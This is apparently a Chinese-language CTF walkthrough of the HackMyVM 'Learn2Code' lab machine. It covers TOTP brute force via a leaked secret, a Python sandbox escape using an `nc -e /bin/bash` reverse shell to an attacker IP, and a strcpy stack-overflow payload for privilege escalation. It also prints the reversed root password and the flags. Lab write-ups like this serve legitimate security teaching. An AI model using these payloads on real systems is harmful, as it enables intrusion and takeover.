---
title: MazeSec Learn2Code
date: 2025-04-01 17:31:00
categories: 
  - MazeSec
tags:
  - 弱口令
  - Python 沙箱逃逸
  - Python 升级为交互式 Shell
  - strcpy 栈溢出
  - 逆向
---

# Learn2Code

项目地址：https://downloads.hackmyvm.eu/learn2code.zip

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a1e8146b69adaba3f880632.png)

## 弱口令

### Type the Google Authenticator code

访问 80 端口只给了一个输入框

![](https://pic1.imgdb.cn/item/6a1e861ab69adaba3f88097c.png)

查看源代码发现引入了 `/includes/js/functions.js` 这一文件

```js
function check_code() {
    // 构造请求参数数组，包含操作类型和用户输入的代码
    var params = new Array(
        "action=check_code",        // 指定后端执行的操作为"检查代码"
        "code=" + $('#code').val()  // 获取 id 为 "code" 的输入框中的值
    );

    // 通过 php_ajax 函数发送异步请求到 access.php
    php_ajax(params, "includes/php/access.php", function(response) {
        // 如果响应内容中包含 "wrong" 字符串，说明代码校验失败
        if (response.indexOf("wrong") != -1) {
            // 显示 class 为 "result" 的元素（通常用于展示错误提示信息）
            $('.result').show();
        } else {
            // 校验通过，用后端返回的内容直接替换整个页面 body 的内容
            $('body').html(response);
        }
    });
}

function run_code() {
    // 构造请求参数数组，包含操作类型和用户输入的自定义代码
    var params = new Array(
        "action=run_code",                // 指定后端执行的操作为"运行代码"
        "code=" + $('#custom_code').val() // 获取 id 为 "custom_code" 的输入框中的值
    );

    // 通过 php_ajax 函数发送异步请求到 runcode.php
    php_ajax(params, "includes/php/runcode.php", function(response) {
        // 将后端返回的代码执行结果，设置到 id 为 "response_code" 的文本框/文本域中
        $('#response_code').val(response);
    });
}
```

`/includes/js/custom_lib.js`

```js
function php_ajax(params, php_file, response)
{
    // 遍历参数数组，将数组元素拼接成 URL 编码格式的查询字符串（如 "key1=value1&key2=value2"）
    for (var i = 0; i < params.length; i += 1) {
        if (i == 0) {
            // 第一个参数直接赋值
            var parametros = params[i];
        } else {
            // 后续参数使用 "&" 符号进行拼接
            parametros = parametros + "&" + params[i];
        }
    }

    // 创建原生的 XMLHttpRequest 对象，用于发送异步 HTTP 请求
    var xmlhttp = new XMLHttpRequest();
    
    // 监听请求状态的变化
    xmlhttp.onreadystatechange = function() {
        // readyState == 4 表示请求已完成且响应已就绪
        // status == 200 表示 HTTP 请求成功 (OK)
        if (this.readyState == 4 && this.status == 200) {
            // 调用传入的回调函数，并将后端返回的纯文本响应（responseText）传递给它
            response(this.responseText);
        }
    };

    // 初始化一个 POST 请求
    // 参数1: 请求方法 ("POST")
    // 参数2: 请求的目标 URL (php_file)
    // 参数3: 是否异步执行 (true 表示异步)
    xmlhttp.open("POST", php_file, true);
    
    // 设置 HTTP 请求头，告知服务器发送的数据格式为标准的表单 URL 编码格式
    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    
    // 发送请求，并将拼接好的参数字符串作为请求体（Body）传递给服务器
    xmlhttp.send(parametros);
}
```

扫描目录发现文件

![](https://pic1.imgdb.cn/item/6a1e8a49b69adaba3f88161b.png)

下载备份文件拿到源码

```php
<?php
    // 引入 Google Authenticator (TOTP 动态口令) 验证库
    require_once 'GoogleAuthenticator.php';
    
    // 实例化 Google Authenticator 对象
    $ga = new PHPGangsta_GoogleAuthenticator();
    
    // 定义用于验证动态口令的 Base32 编码密钥（Secret Key）
    $secret = "S4I22IG3KHZIGQCJ";

    // 判断前端 AJAX 传递过来的操作类型是否为 'check_code'（校验验证码）
    if ($_POST['action'] == 'check_code') {
        // 获取用户在前端输入的动态验证码
        $code = $_POST['code'];
        
        // 验证用户输入的验证码是否与基于当前时间生成的 TOTP 匹配
        // 参数说明：
        // 1. $secret : 共享密钥
        // 2. $code   : 用户提交的验证码
        // 3. 1       : 容差（时间漂移窗口）。设为 1 表示允许前后 1 个时间步长（通常为 30 秒）的误差。
        //              即同时校验"前30秒"、"当前30秒"、"后30秒"的验证码，防止因设备时间轻微不同步导致验证失败。
        $result = $ga->verifyCode($secret, $code, 1);

        // 根据验证结果进行相应的业务处理
        if ($result) {
            // 验证通过：引入并执行 coder.php 文件
            // coder.php 输出的 HTML 内容会作为 AJAX 的 responseText 返回给前端，
            // 前端随后会通过 $('body').html(response) 将其渲染到页面上。
            include('coder.php');
        } else {
            // 验证失败：直接输出 "wrong" 字符串
            // 前端 JS 会检测到响应中包含 "wrong"，从而显示错误提示信息。
            echo "wrong";
        }
    }
?>
```

这里也可以用 Python 直接生成

```python
python3 -c "import pyotp; print(pyotp.TOTP('S4I22IG3KHZIGQCJ').now())"
```

![](https://pic1.imgdb.cn/item/6a1e8a5db69adaba3f88162d.png)

看样子我们必须得通过 `code` 验证

查看前端代码发现长度固定为六位

![](https://pic1.imgdb.cn/item/6a1e8d12b69adaba3f881904.png)

BP 里面抓包设置类型开始爆破

![](https://pic1.imgdb.cn/item/6a1e8d3fb69adaba3f88191b.png)

爆破成功，但是有时间限制，必须得快速登录

![](https://pic1.imgdb.cn/item/6a1e8cd6b69adaba3f8818e5.png)

登录成功

![](https://pic1.imgdb.cn/item/6a1ee36bb69adaba3f899873.png)

## RCE

### Python 沙箱逃逸

结合上面泄露的源码分析，这里应该是要输入代码

测试 `whoami` 报错出一个 Python 错误，说明后端是 Python

![](https://pic1.imgdb.cn/item/6a1ee46eb69adaba3f8998b0.png)

```python
mod=__import__('os');mod.popen('nc -e /bin/bash 192.168.125.4 9999')
```

- `__import__()`：Python 的内建函数，用于动态导入模块，等价于 `import os`

- 在单行命令注入场景中（如 `python -c "..."`），`import` 语句需要独占一行，而 `__import__()` 是表达式，可以嵌入到任意位置

- `mod.popen`：在底层调用 `fork()` 创建子进程

- 子进程通过 `/bin/sh -c` 执行传入的命令字符串

- `-e /bin/bash`：在连接建立后，将 `/bin/bash` 的 `stdin/stdout/stderr` 全部重定向到该 TCP Socket

![](https://pic1.imgdb.cn/item/6a1ee6c2b69adaba3f899903.png)

收到 Shell

![](https://pic1.imgdb.cn/item/6a1ee818b69adaba3f899946.png)

## 提权

### Python 升级为交互式 Shell

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

### strcpy 栈溢出

查找 SUID 权限文件发现 `MakeMeLearner`

![](https://pic1.imgdb.cn/item/6a1efa7eb69adaba3f89d68d.png)

直接运行提示需要指定一个参数，加上 `-h` 回显内容和二进制有关

![](https://pic1.imgdb.cn/item/6a1efba2b69adaba3f89d6a5.png)

检查安装的软件有 Python3，开启 HTTP 服务下载这个二进制文件

![](https://pic1.imgdb.cn/item/6a1efc2cb69adaba3f89d6b8.png)

反编译看伪代码发现要让 `v5` 等于 `0x61626364`

![](https://pic1.imgdb.cn/item/6a1efcfbb69adaba3f89d6e0.png)

在 `if` 前面有一个 `strcpy(dest, argv[1]);` 拷贝命令

查看 `dest` 和 `v5` 的位置，发现存在溢出（`var_4` 就是 `v5`）

![](https://pic1.imgdb.cn/item/6a1effbbb69adaba3f8a13e9.png)

在 ASCII 码中：

- `0x61 = 'a'`

- `0x62 = 'b'`

- `0x63 = 'c'`

- `0x64 = 'd'`

由于计算机是小端序存储，低位字节存放在低地址，从低到高应该依次是 `\x64 \x63 \x62 \x61`

最终构造 Payload

```bash
./MakeMeLearner $(python3 -c "print('A' * 76 + 'dcba')")
```

![](https://pic1.imgdb.cn/item/6a1eff6fb69adaba3f8a13e6.png)

在 www-data 用户的 Shell 下运行这段命令可以提权到 learner 用户

### 逆向

这个用户也有一个程序，名称是 `MySecretPasswordVault`

IDA 逆向发现字符串，拼接起来就是 root 用户的密码——`NI98hIhj)(Jj`

![](https://pic1.imgdb.cn/item/6a1f02d6b69adaba3f8a1423.png)

因为靶机可能有时候会崩，但是 Web 又得重新爆破一遍，这样就太浪费时间了

所以我将 flag 放在下面

```
N1c3m0veMat3!
Y0uG0TitbR0!
```